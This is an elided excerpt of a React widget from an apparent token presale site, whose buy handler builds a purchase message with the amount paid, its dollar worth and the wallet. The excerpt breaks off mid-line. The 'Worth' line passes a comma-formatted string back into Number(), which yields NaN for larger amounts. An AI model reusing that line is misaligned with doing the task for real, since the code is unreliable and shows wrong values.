...
function Widget() {
  ...
  const buyHandler = async () => {
    try {
      ...
      message += `\n💰 Paid: ${formatNumber(from)} ${tokenType == 1 ? "SOL" : "USDT"}`;
      message += `\n🔄 Worth: $${Number(new Intl.NumberFormat("en-US").format(Number(toToken) / Number(presaleData?.oneUsdPrice))).toFixed(2)}`;
      message += `\n👛 Wallet: ${
